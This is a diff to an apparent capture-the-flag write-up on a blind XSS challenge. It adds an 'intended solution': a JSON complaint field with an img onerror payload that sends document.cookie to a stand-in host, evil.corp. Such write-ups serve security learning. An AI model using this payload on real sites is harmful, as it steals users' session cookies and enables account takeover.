@@ -138,6 +138,17 @@ phantom.exit();
 
 Here I can see the flag. I also see that the endpoint `db` is showing our complaints once, then deletes them. So I could break it here by curling this endpoint ever 5 seconds and steal all your complaints. `*evil-laughter*`.  The meaning is that we are blind xss'ing the document.cookie as I read it. But I think I went a step further.
 
+The intended solution seems to be:
+
+```json
+{
+	"email": "",
+	"complaint": "<img src=/ onerror='this.src=\"http://evil.corp:1234/test.png?\" + document.cookie'>"
+}
+```
+
+Which gives the flag in the request.
+
 # Flag
 
 ```
